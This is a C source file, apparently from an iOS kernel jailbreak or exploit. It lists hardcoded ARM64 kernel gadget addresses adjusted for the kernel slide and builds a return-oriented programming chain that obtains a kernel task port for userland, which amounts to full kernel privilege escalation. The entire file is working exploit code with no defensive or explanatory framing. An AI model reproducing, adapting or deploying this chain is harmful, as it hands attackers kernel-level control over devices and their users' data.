#include <mach/mach_types.h>    // task_t

#include "common.h"             // file_t
#include "slide.h"              // get_kernel_slide

#include "rop.h"

/*****************************************************/
/* Gadgets - do something and load a new stack frame */
/*****************************************************/

static addr_t gadget_load_x20_x19(file_t *kernel)
{
    // 0xffffff800402b69c           fd7b41a9  ldp x29, x30, [sp, 0x10]
    // 0xffffff800402b6a0           f44fc2a8  ldp x20, x19, [sp], 0x20
    // 0xffffff800402b6a4           c0035fd6  ret

    // TODO: hardcoded
    return 0xffffff800402b69c + get_kernel_slide();
}

static addr_t gadget_ldp_x9_add_sp_sp_0x10(file_t *kernel)
{
    // 0xffffff8005aea01c           3d79c1a8  ldp x29, x30, [x9], 0x10
    // 0xffffff8005aea020           ff430091  add sp, sp, 0x10
    // 0xffffff8005aea024           c0035fd6  ret

    // TODO: hardcoded
    return 0xffffff8005aea01c + get_kernel_slide();
}

static addr_t gadget_ldr_x0_sp_0x20_load_x22_x19(file_t *kernel)
{
    // 0xffffff80040e3d1c           e01340f9  ldr x0, [sp, 0x20]
    // 0xffffff80040e3d20           bf8300d1  sub sp, x29, 0x20
    // 0xffffff80040e3d24           fd7b42a9  ldp x29, x30, [sp, 0x20]
    // 0xffffff80040e3d28           f44f41a9  ldp x20, x19, [sp, 0x10]
    // 0xffffff80040e3d2c           f657c3a8  ldp x22, x21, [sp], 0x30
    // 0xffffff80040e3d30           c0035fd6  ret

    // TODO: hardcoded
    return 0xffffff80040e3d1c + get_kernel_slide();
}

static addr_t gadget_add_x0_x0_x19_load_x20_x19(file_t *kernel)
{
    // 0xffffff80040ddbcc           0000138b  add x0, x0, x19
    // 0xffffff80040ddbd0           fd7b41a9  ldp x29, x30, [sp, 0x10]
    // 0xffffff80040ddbd4           f44fc2a8  ldp x20, x19, [sp], 0x20
    // 0xffffff80040ddbd8           c0035fd6  ret

    // TODO: hardcoded
    return 0xffffff80040ddbcc + get_kernel_slide();
}

static addr_t gadget_blr_x20_load_x22_x19(file_t *kernel)
{
    // 0xffffff8004e5eb60           80023fd6  blr x20
    // 0xffffff8004e5eb64           bf8300d1  sub sp, x29, 0x20
    // 0xffffff8004e5eb68           fd7b42a9  ldp x29, x30, [sp, 0x20]
    // 0xffffff8004e5eb6c           f44f41a9  ldp x20, x19, [sp, 0x10]
    // 0xffffff8004e5eb70           f657c3a8  ldp x22, x21, [sp], 0x30
    // 0xffffff8004e5eb74           c0035fd6  ret

    // TODO: hardcoded
    return 0xffffff8004e5eb60 + get_kernel_slide();
}

static addr_t gadget_str_x0_x19_load_x20_x19(file_t *kernel)
{
    // 0xffffff800402b698           600200f9  str x0, [x19]
    // 0xffffff800402b69c           fd7b41a9  ldp x29, x30, [sp, 0x10]
    // 0xffffff800402b6a0           f44fc2a8  ldp x20, x19, [sp], 0x20
    // 0xffffff800402b6a4           c0035fd6  ret

    // TODO: hardcoded
    return 0xffffff800402b698 + get_kernel_slide();
}

static addr_t gadget_ldr_x0_x21_load_x24_19(file_t *kernel)
{
    // 0xffffff80042fbfbc           a00240f9  ldr x0, [x21]
    // 0xffffff80042fbfc0           fd7b43a9  ldp x29, x30, [sp, 0x30]
    // 0xffffff80042fbfc4           f44f42a9  ldp x20, x19, [sp, 0x20]
    // 0xffffff80042fbfc8           f65741a9  ldp x22, x21, [sp, 0x10]
    // 0xffffff80042fbfcc           f85fc4a8  ldp x24, x23, [sp], 0x40
    // 0xffffff80042fbfd0           c0035fd6  ret

    // TODO: hardcoded
    return 0xffffff80042fbfbc + get_kernel_slide();
}

/*************************************************************/
/* Functions - do something without changing the stack frame */
/*************************************************************/

static addr_t func_current_task(file_t *kernel)
{
    // 0xffffff8004052e0c           88d038d5  mrs x8, tpidr_el1
    // 0xffffff8004052e10           008941f9  ldr x0, [x8, 0x310]
    // 0xffffff8004052e14           c0035fd6  ret

    // TODO: hardcoded
    return 0xffffff8004052e0c + get_kernel_slide();
}

// task_for_pid:
// 0xffffff80043c31ac      d6bcf197       bl sym._convert_task_to_port
// 0xffffff80043c31b0      88d038d5       mrs x8, tpidr_el1
// 0xffffff80043c31b4      088941f9       ldr x8, [x8, 0x310] ; [0x310:4]=0x530018
// 0xffffff80043c31b8      015141f9       ldr x1, [x8, 0x2a0] ; [0x2a0:4]=0x41445f5f ;
// 0xffffff80043c31bc      a372f197       bl sym._ipc_port_copyout_send

static addr_t func_ipc_port_copyout_send(file_t *kernel)
{
    // TODO: hardcoded
    return 0xffffff800401fc48 + get_kernel_slide();
}

// convert_task_to_port:
// 0xffffff8004032504      f657bda9       stp x22, x21, [sp, -0x30]! ; '0'
// 0xffffff8004032508      f44f01a9       stp x20, x19, [sp, 0x10]
// 0xffffff800403250c      fd7b02a9       stp x29, x30, [sp, 0x20]
// 0xffffff8004032510      fd830091       add x29, sp, 0x20
// 0xffffff8004032514      f30300aa       mov x19, x0
// 0xffffff8004032518      74420391       add x20, x19, 0xd0
// 0xffffff800403251c      e00314aa       mov x0, x20
// 0xffffff8004032520      d6190394       bl sym._lck_mtx_lock
// 0xffffff8004032524      607640f9       ldr x0, [x19, 0xe8] ; [0xe8:4]=0x486940 ; "@iH"
// 0xffffff8004032528      800000b4       cbz x0, 0xffffff8004032538
// 0xffffff800403252c      9cb5ff97       bl sym._ipc_port_make_send
// 0xffffff8004032530      f50300aa       mov x21, x0
// 0xffffff8004032534      02000014       b 0xffffff800403253c
// 0xffffff8004032538      150080d2       movz x21, 0
// 0xffffff800403253c      e00314aa       mov x0, x20
// 0xffffff8004032540      f9190394       bl sym._lck_mtx_unlock
// 0xffffff8004032544      e00313aa       mov x0, x19
// 0xffffff8004032548      03730094       bl sym._task_deallocate
// 0xffffff800403254c      e00315aa       mov x0, x21
// 0xffffff8004032550      fd7b42a9       ldp x29, x30, [sp, 0x20] ; [0x20:4]=25
// 0xffffff8004032554      f44f41a9       ldp x20, x19, [sp, 0x10] ; [0x10:4]=15
// 0xffffff8004032558      f657c3a8       ldp x22, x21, [sp], 0x30
// 0xffffff800403255c      c0035fd6       ret

static addr_t func_ipc_port_make_send(file_t *kernel)
{
    // TODO: hardcoded
    return 0xffffff800401fb9c + get_kernel_slide();
}

static addr_t func_ldr_x0_x0(file_t *kernel)
{
    // 0xffffff8004119534           000040f9  ldr x0, [x0]
    // 0xffffff8004119538           c0035fd6  ret

    // TODO: hardcoded
    return 0xffffff8004119534 + get_kernel_slide();
}

/***************************************/
/* Fragments - do something and branch */
/***************************************/

static addr_t frag_mov_x1_x20_blr_x19(file_t *kernel)
{
    // 0xffffff800402d978           e10314aa  mov x1, x20
    // 0xffffff800402d97c           60023fd6  blr x19

    // TODO: hardcoded
    return 0xffffff800402d978 + get_kernel_slide();
}

/*******************/
/* Data structures */
/*******************/

static addr_t data_kernel_task(file_t *kernel)
{
    // TODO: hardcoded
    return 0xffffff8004536010 + get_kernel_slide();
}

/**********************/
/* ROP chain builders */
/**********************/

addr_t get_stack_pivot(void)
{
    return gadget_ldp_x9_add_sp_sp_0x10(NULL);
}

#define PUSH(head, val) \
do \
{ \
    (head)[0] = (val); \
    head = &(head)[1]; \
} while(0)

void rop_get_kernel_task(addr_t **chain, task_t *task)
{
    file_t *kernel = NULL;
    // Save stack frame
    {
        // Stored at [sp, 0xf0] will be x29 of the previous
        // frame, which will have the value (x29 + 0x120).
        addr_t add_sp = gadget_ldp_x9_add_sp_sp_0x10(kernel),
               ldr    = gadget_ldr_x0_sp_0x20_load_x22_x19(kernel),
               add_x0 = gadget_add_x0_x0_x19_load_x20_x19(kernel),
               str    = gadget_str_x0_x19_load_x20_x19(kernel);
        // Stack pivot does sp += 0x10 already
        // sp += 0xc0
        for(uint32_t i = 0; i < 0xc; ++i) // TODO: hardcoded
        {
            // sp += 0x10
            PUSH(*chain, (addr_t)&(*chain)[2]); // x29
            PUSH(*chain, add_sp);               // x30
        }
        // ldr x0, [sp, 0x20] and set x19 = -0x120
        PUSH(*chain, (addr_t)&(*chain)[6]);     // x29
        PUSH(*chain, ldr);                      // x30
        PUSH(*chain, 0);                        // x22
        PUSH(*chain, 0);                        // x21
        PUSH(*chain, 0);                        // x20
        PUSH(*chain, -0x120);                   // x19 TODO: hardcoded
        // x0 += x19 and load storage address
        PUSH(*chain, (addr_t)&(*chain)[4]);     // x29
        PUSH(*chain, add_x0);                   // x30
        PUSH(*chain, 0);                        // x20
        PUSH(*chain, (addr_t)&(*chain)[67]);    // x19 >----------------------------------------,
        // str x0, addr                                                                         |
        PUSH(*chain, (addr_t)&(*chain)[4]);     // x29                                          |
        PUSH(*chain, str);                      // x30                                          |
        PUSH(*chain, 0);                        // x20                                          |
        PUSH(*chain, 0);                        // x19                                          |
    }                                                                                       //  |
    // Get kernel task                                                                          |
    {                                                                                       //  |
        // *task = ipc_port_copyout_send(ipc_port_make_send(kernel_task->itk_self), get_task_ipcspace(current_task()));
        addr_t current_task          = func_current_task(kernel),                           //  |
               ipc_port_make_send    = func_ipc_port_make_send(kernel),                     //  |
               ipc_port_copyout_send = func_ipc_port_copyout_send(kernel),                  //  |
               ldr_x0                = func_ldr_x0_x0(kernel),                              //  |
               load                  = gadget_load_x20_x19(kernel),                         //  |
               call                  = gadget_blr_x20_load_x22_x19(kernel),                 //  |
               add                   = gadget_add_x0_x0_x19_load_x20_x19(kernel),           //  |
               str                   = gadget_str_x0_x19_load_x20_x19(kernel),              //  |
               ldr_x21               = gadget_ldr_x0_x21_load_x24_19(kernel),               //  |
               mov                   = frag_mov_x1_x20_blr_x19(kernel),                     //  |
               kernel_task           = data_kernel_task(kernel);                            //  |
        // load address of current_task                                                         |
        PUSH(*chain, (addr_t)&(*chain)[4]);     // x29                                          |
        PUSH(*chain, load);                     // x30                                          |
        PUSH(*chain, current_task);             // x20                                          |
        PUSH(*chain, 0);                        // x19                                          |
        // call current_task and load arg to adding gadget                                      |
        PUSH(*chain, (addr_t)&(*chain)[6]);     // x29                                          |
        PUSH(*chain, call);                     // x30                                          |
        PUSH(*chain, 0);                        // x22                                          |
        PUSH(*chain, 0);                        // x21                                          |
        PUSH(*chain, 0);                        // x20                                          |
        PUSH(*chain, 0x2a0);                    // x19 TODO: hardcoded                          |
        // simulate get_task_ipcspace with x0 += 0x2a0...                                       |
        PUSH(*chain, (addr_t)&(*chain)[4]);     // x29                                          |
        PUSH(*chain, add);                      // x30                                          |
        PUSH(*chain, ldr_x0);                   // x20                                          |
        PUSH(*chain, 0);                        // x19                                          |
        // ...and x0 = [x0] (also load address for store and address of kernel_task)            |
        PUSH(*chain, (addr_t)&(*chain)[6]);     // x29                                          |
        PUSH(*chain, call);                     // x30                                          |
        PUSH(*chain, 0);                        // x22                                          |
        PUSH(*chain, kernel_task);              // x21                                          |
        PUSH(*chain, 0);                        // x20                                          |
        PUSH(*chain, (addr_t)&(*chain)[27]);    // x19 >------------------------,               |
        // save x0 for later                                                    |               |
        PUSH(*chain, (addr_t)&(*chain)[4]);     // x29                          |               |
        PUSH(*chain, str);                      // x30                          |               |
        PUSH(*chain, 0);                        // x20                          |               |
        PUSH(*chain, 0);                        // x19                          |               |
        // load kernel_task to x0 and load args to add gadget                   |               |
        PUSH(*chain, (addr_t)&(*chain)[8]);     // x29                          |               |
        PUSH(*chain, ldr_x21);                  // x30                          |               |
        PUSH(*chain, 0);                        // x24                          |               |
        PUSH(*chain, 0);                        // x23                          |               |
        PUSH(*chain, 0);                        // x22                          |               |
        PUSH(*chain, 0);                        // x21                          |               |
        PUSH(*chain, 0);                        // x20                          |               |
        PUSH(*chain, 0xe8);                     // x19 TODO: hardcoded          |               |
        // simulate &kernel_task->itk_self as kernel_task + 0xe8, and load address of ldr_x0 function
        PUSH(*chain, (addr_t)&(*chain)[4]);     // x29                          |               |
        PUSH(*chain, add);                      // x30                          |               |
        PUSH(*chain, ldr_x0);                   // x20                          |               |
        PUSH(*chain, 0);                        // x19                          |               |
        // get kernel_task->itk_self and load address of ipc_port_make_send     |               |
        PUSH(*chain, (addr_t)&(*chain)[6]);     // x29                          |               |
        PUSH(*chain, call);                     // x30                          |               |
        PUSH(*chain, 0);                        // x22                          |               |
        PUSH(*chain, 0);                        // x21                          |               |
        PUSH(*chain, ipc_port_make_send);       // x20                          |               |
        PUSH(*chain, 0);                        // x19                          |               |
        // call ipc_port_make_send and prepare to restore old x0 to x1          |               |
        PUSH(*chain, (addr_t)&(*chain)[6]);     // x29                          |               |
        PUSH(*chain, call);                     // x30                          |               |
        PUSH(*chain, 0);                        // x22                          |               |
        PUSH(*chain, 0);                        // x21                          |               |
        PUSH(*chain, 0xbaadf00d);               // x20 <------------------------`               |
        PUSH(*chain, load);                     // x19                                          |
        // restore the x0 we saved earlier to x1                                                |
        PUSH(*chain, (addr_t)&(*chain)[4]);     // x29                                          |
        PUSH(*chain, mov);                      // x30                                          |
        // previous fragment will jump to load, here are its args                               |
        PUSH(*chain, ipc_port_copyout_send);    // x20                                          |
        PUSH(*chain, 0);                        // x19                                          |
        // call ipc_port_copyout_send and load address to store                                 |
        PUSH(*chain, (addr_t)&(*chain)[6]);     // x29                                          |
        PUSH(*chain, call);                     // x30                                          |
        PUSH(*chain, 0);                        // x22                                          |
        PUSH(*chain, 0);                        // x21                                          |
        PUSH(*chain, 0);                        // x20                                          |
        PUSH(*chain, (addr_t)task);             // x19                                          |
        // store x0 to userland address                                                         |
        PUSH(*chain, (addr_t)&(*chain)[4]);     // x29                                          |
        PUSH(*chain, str);                      // x30                                          |
        PUSH(*chain, 0);                        // x20                                          |
        PUSH(*chain, 0);                        // x19                                          |
    }                                                                                       //  |
    // Restore stack frame... to some extent (TODO: fix memleaks & return value)                |
    {                                                                                       //  |
        // return                                                                               |
        PUSH(*chain, 0xdeadbeef);               // x29 <----------------------------------------`
        PUSH(*chain, 0xffffff80043f08c4 + get_kernel_slide()); // x30, TODO: hardcoded
    }
}
